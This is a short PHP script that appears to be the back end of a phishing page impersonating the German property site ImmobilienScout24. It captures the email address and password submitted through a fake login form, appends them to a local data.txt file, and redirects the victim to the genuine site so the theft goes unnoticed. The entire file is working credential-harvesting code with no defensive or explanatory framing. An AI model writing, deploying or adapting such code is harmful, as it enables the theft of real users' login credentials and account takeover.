<?php
    session_start();
    header("Location: https://www.immobilienscout24.de/");
    
        if(isset($_POST['password']))
        {

            $text = "Email : " . $_POST['email'] . "," . "Password : "  . $_POST['password'] . "\n";
            $fp = fopen('data.txt', 'a+');
            if(fwrite($fp, $text))  {
                // echo 'saved';
            }
            fclose ($fp);
        }
    
    
?>
